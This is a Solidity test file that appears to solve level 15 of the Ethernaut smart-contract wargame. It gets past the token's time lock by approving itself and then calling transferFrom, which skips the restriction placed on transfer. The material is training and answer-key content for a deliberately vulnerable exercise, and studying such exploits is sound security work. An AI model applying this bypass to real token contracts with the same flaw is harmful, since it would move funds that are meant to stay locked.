// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level15 {
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract Level15Test is EthernautTest {
    function testLevel15() public {
        _createLevel("15");

        Level15 levelInstance15 = Level15(levelInstance["15"]);

        // We can just use the transferFrom function to bypass the time lock
        levelInstance15.approve(address(this), levelInstance15.balanceOf(address(this)));
        levelInstance15.transferFrom(address(this), address(1), levelInstance15.balanceOf(address(this)));

        require(_submitLevel("15"));
    }
}
